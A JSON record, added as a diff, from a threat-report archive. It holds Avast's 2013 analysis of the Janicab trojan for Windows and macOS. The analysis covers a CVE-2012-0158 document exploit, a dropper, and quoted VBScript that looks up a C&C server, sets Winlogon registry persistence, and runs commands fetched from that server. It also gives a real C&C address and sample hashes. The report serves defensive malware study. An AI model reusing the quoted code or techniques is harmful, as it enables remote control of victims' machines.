@@ -1,0 +1,60 @@
+{
+    "id": "88f28b9f-edf3-4608-8e6a-63ce78056014",
+    "created_at": "2023-01-12T14:59:44.560663Z",
+    "updated_at": "2025-03-27T02:09:08.042322Z",
+    "deleted_at": null,
+    "sha1_hash": "a066955188979a22247318b93a9852a99938ad6a",
+    "title": "2013-07-22 - Multisystem Trojan Janicab attacks Windows and MacOSX via scripts",
+    "authors": "",
+    "file_creation_date": "2022-05-28T03:59:56Z",
+    "file_modification_date": "2022-05-28T03:59:56Z",
+    "file_size": 212199,
+    "plain_text": "# Multisystem Trojan Janicab attacks Windows and MacOSX via scripts\n\n**[blog.avast.com/2013/07/22/multisystem-trojan-janicab-attacks-windows-and-macosx-via-scripts/](https://blog.avast.com/2013/07/22/multisystem-trojan-janicab-attacks-windows-and-macosx-via-scripts/)**\n\nMultisystem Trojan Janicab attacks Windows and MacOSX via scripts\n\nOn Friday, July 12th a warning from an AVAST fan about a new polymorphic multisystem\nthreat came to an inbox of AVAST. Moreover, an archive of malicious files discussed here\n[were attached. Some of them have been uploaded to Virustotal and therefore they have](http://www.virustotal.com/en/)\nbeen shared with computer security professionals on the same day. A weekend had passed\nby and articles full of excitement about a new Trojan for MacOs started to appear on the\n[web. We decided to make a thorough analysis and not to quickly jump on the bandwagon.](http://en.wikipedia.org/wiki/Bandwagon_effect)\nThe key observation is that the final payload comes in the form of scripts needed to be\ninterpreted by Windows Script Console resp; Python in the case of MacOs. Moreover a script\ngenerator that creates new malicious Windows file shortcuts was also included.\n\n**Windows version**\n\nA chain of events that installs a malicious Visual Basic script on Windows platform looks like\nthis:\n\n\n-----\n\n[In the beginning there is a malicious Office Open XML Document containing two embedded](http://en.wikipedia.org/wiki/Office_Open_XML)\nbinary files. One of them is called ActiveX.bin and it carries the main shell-code that is\n[triggered by a widely spread exploit CVE-2012-0158 (under special settings ActiveX controls](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158)\nin MSCOMCTL.OCX trigger code execution). Shell-code itself in decrypted with a initial loop\nthat uses 0xEE as a one-byte key. Then a few API functions necessary for dropping of\nanother file are resolved by a hash (VirtualAlloc, CreateFile, ReadFile, WriteFile,\nGetTempPath, CloseHandle). In the figure we can see a check of a magic value\n0xB19B00B5 (a shell-code consequently performs this step twice, because a general\nmemory search could return an address of its own assembly instead of the location in the\ndata). A temporary file \"a.l\" is created.\n\n\n-----\n\nThe step that follows is decrypted from the second embedded binary with a name\n_ActiveX1.bin. It is loaded into a buffer that is pointed by edi register. A two bytes and one_\ndouble word are extracted and immediately used in a decryption routine (one-byte XOR with\na key additively changed by a constant in every iteration). A dynamic linked library is\ndropped and loaded.\n\nThe dropper simply loads and executes two files in resources that are unencrypted. The first\nis a Word document that is not malicious and its purpose is not to raise any suspicion after\nopening such a document. The second is a malicious Visual Basic script \"1.vbe\" encoded\nwith a Windows Script Encoder screnc.exe. This script is a final payload of the chain and is\ntagged with a version number \"1.0.4\".\n\n\n-----\n\nDepending on the system version, the malware seeks for an antivirus product in Windows\nManagement Instrumentation (WMI) executing query \"Select displayName from\nAntiVirusProduct\" on the WMI object \"winmgmts:\n{impersonationLevel=impersonate}!\\\\.\\root\\SecurityCenter2\". It stores a value into the\nvariable installedAV. Then it randomly chooses a youtube.com link from a hard-coded list\nand evaluates a regular expression on the received content:\n\n\n-----\n\nrandLink = YouTubeLinks(Int((max-min+1)*Rnd+min))outputHTML = getPage(randLink,\n60)Set objRE = New RegExp\n\nWith objRE\n\n.Pattern = \"just something i made up for fun, check out my website at (.*) bye bye\"\n\n.IgnoreCase = True\n\nEnd With\nSet objMatch = objRE.Execute( outputHTML )\n\nIf objMatch.Count = 1 Then\n\nserver = \"http://\" & objMatch.Item(0).Submatches(0)\n\nEnd If\n\nif getPage(server & \"/Status.php\", 30) = \"OK\" Then\nserverExists = 1\n\nEnd if\n\nSeeking the pattern on the web in cached YouTube pages it turned out that an expression\n\"111.90.152.210/cc\" could have been returned as a C&C server address.\n\nPersistence on the infected system is decided by C&C:\n\nstartupMethod = getPage(server & \"/sMethod.php?av=\" & installedAV, 60)\n\nIf it commands a keyword \"reg\" as a startup method then a registry file containing lines\n\n\"[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\n\n\"Shell\"=\"wscript.exe \\\"%userprofile%\\\\SystemFolder\\\\.vbe\\\"\"\n\nwill be imported.\n\nSpying functionality is not present in this variant. The main malicious action is constantly\nawaiting commands from C&C to execute it on the victim's computer (getPage involves\ncreating \"InternetExplorer.Application\" object and returning html content of the given\naddress):\n\nWhile 1\nOn Error Resume Next\n\ncommandData = getPage(server & \"/gcm.php?sn=\" & Serial, 30)If not\nIsNull(commandData) And commandData \"\" Then\n\ns.Run \"cmd /c \" & c, 0\n\nEnd IfWScript.Sleep 60000\n\nWend\n\n**MacOsX version**\n\nAs mentioned in the introduction, the variant for MacOs uses Python compiled scripts and it\n[is described with a lot of relevant screenshots (another reference is here). It uses a right-to-](http://www.f-secure.com/weblog/archives/00002576.html)\n[left override method to confuse the user while executing (Windows malware uses similar](https://blog.avast.com/2011/09/07/unpacking-the-unitrix-malware)\n\n\n-----\n\nmasking). The internal version number said 3.0.6 and so probably it was longer in\ndevelopment.\n\nSpying activities consist of recording audio using command line tool called \"Sound\n_eXchange\" and taking screenshots controlled by mouse actions (resolved by a freely_\ndistributed command line tool mt which is a shortcut for MouseTools ):\n\nFor comparison with the Windows version observe that a C&C server is obtained in very\nsimilar way:\n\nPersistence is achieved by adding an initial malicious script \"runner.pyc\" into [cron:](http://en.wikipedia.org/wiki/Cron)\n\n\n-----\n\n**Script Builder**\n\nThere is a simple php script available that creates an archive with a file shortcut that runs a\nscript derived from a particular template and displays any desired distracting image. As a\nscript template implicitly works a Windows version of Janicab. Even if methods of generating\nnew samples seem basic it is interesting to see malware coming as a whole package as it is\nin this case.\n\n**Sources**\n\nFinally, MD5 of some selected samples with the detections of avast! engine are provided.\nDetections of samples connected with the Windows version are very low prevalent within AV\nproducts.\n\nJanicab/StarterScreenShots.pyc [64e788f1599196e23b628466cac3f909](http://www.virustotal.com/en/file/99f09a02f13ae0a97b9492e0e0f7098801c264b7d8155ea414222a31690c4a2d/analysis/1373965287/) MacOs:JanicabD [Trj]\n\nJanicab/StarterRec.pyc [fcd6aec6f73d98500af0d4717ec82ceb](http://www.virustotal.com/en/file/aeafe8f85bd64a6252ba114ad36d91e7dd340986d5c3f1a9bcdf4d6a118044f6/analysis/1373965276/) MacOs:JanicabD [Trj]\n\nJanicab/StarterCmdExec.pyc [9c9ca021bb33ce195c470cb22faef710](http://www.virustotal.com/en/file/da2efd2f59137b0d1d72af568449d901396759b25d35318835474c3f84746255/analysis/1373965374/) MacOs:JanicabE [Trj]\n\nJanicab/StarterNetUtils.pyc [3027d5589850d2fef3693a12ca4ec35e](http://www.virustotal.com/en/file/0c6624433e275f2941dc0232bf9e4cfb3a46464c853ab3f39b7c0828bac4ec72/analysis/1373965225/) MacOs:JanicabB [Trj]\n\nJanicab/StarterSettings.pyc [d85bd548decc7866ffd083329e23af8c](http://www.virustotal.com/en/file/df6d4d71a6c73df51b2c5286fb0e0dbb0fe5877ce55902b5269aae75751ab8a5/analysis/1373965254/) MacOs:JanicabA [Trj]\n\nAmazingRaceCyprus.docx [73041092efeb04c4a5e9b6a1a217754c](http://www.virustotal.com/en/file/1feabb796dec49fabeb383c99c95580ca2475f1608d8707f232abd3197a1e11c/analysis/1373880931/) RTF:CVE-20120158-BO [Expl]\n\nJoseMOlazagasti.docx [fef7fdfe74c071310956a753679c80e5](http://www.virustotal.com/en/file/2c48b4b75db16a32f2ea872454c5cb0fe281302d2d6a18d5bdc98c64f31dd2d6/analysis/1373962220/) RTF:CVE-20120158-BO [Expl]\n\nAboutUs.docx [b498d5de87575d4b999e203e71616b69](http://www.virustotal.com/en/file/ef3ee564d6fbe553b88cbe079bec51fcae9f6ff09fc60aaa0e2763443c1ff40e/analysis/1373962356/) RTF:CVE-20120158-BO [Expl]\n\n\n-----\n\nEncoded VB Script [11c987d626f12892f848a42f0a95f810](http://www.virustotal.com/en/file/7371d6fd67e261292ff6709b3c078acbb4e542f49cb50cfb8a2185a9d245cbdf/analysis/1374148168/) VBS:Janicab-A\n\n[Trj]\n\nDynamic Link Library #1 [71eb77493e06b7c17c225cb36f5a054d](http://www.virustotal.com/en/file/30dfd7a56b105d4634622c135cc95afb437bf4cf8ee765b21760845faef2b3c1/analysis/1374246453/) Win32:Janicab-A\n\n[Drp]\n\nDynamic Link Library #2 [1b8406562b7c4b5cdeb393539245f7c0](http://www.virustotal.com/en/file/de741337dd8b4efdb2af1d1784588b21a11a3f5cfd3ab39988bbfffb28d99fdb/analysis/1374246540/) Win32:Janicab-A\n\n[Drp]\n\n**Acknowledgment**\n\nSincere gratitude goes to my colleague Jaromír Hořejší for cooperation on this analysis.\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2013/2013-07-22 - Multisystem Trojan Janicab attacks Windows and MacOSX via scripts.pdf"
+    ],
+    "report_names": [
+        "2013-07-22 - Multisystem Trojan Janicab attacks Windows and MacOSX via scripts.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
+            "created_at": "2022-10-25T16:07:24.471018Z",
+            "updated_at": "2025-03-27T02:02:10.24394Z",
+            "deleted_at": null,
+            "main_name": "Cron",
+            "aliases": [],
+            "source_name": "ETDA:Cron",
+            "tools": [
+                "Catelites",
+                "Catelites Bot",
+                "CronBot",
+                "TinyZBot"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535584,
+    "ts_updated_at": 1743041348,
+    "ts_creation_date": 1653710396,
+    "ts_modification_date": 1653710396,
+    "files": {
+        "pdf": "https://archive.orkl.eu/a066955188979a22247318b93a9852a99938ad6a.pdf",
+        "text": "https://archive.orkl.eu/a066955188979a22247318b93a9852a99938ad6a.txt",
+        "img": "https://archive.orkl.eu/a066955188979a22247318b93a9852a99938ad6a.jpg"
+    }
+}
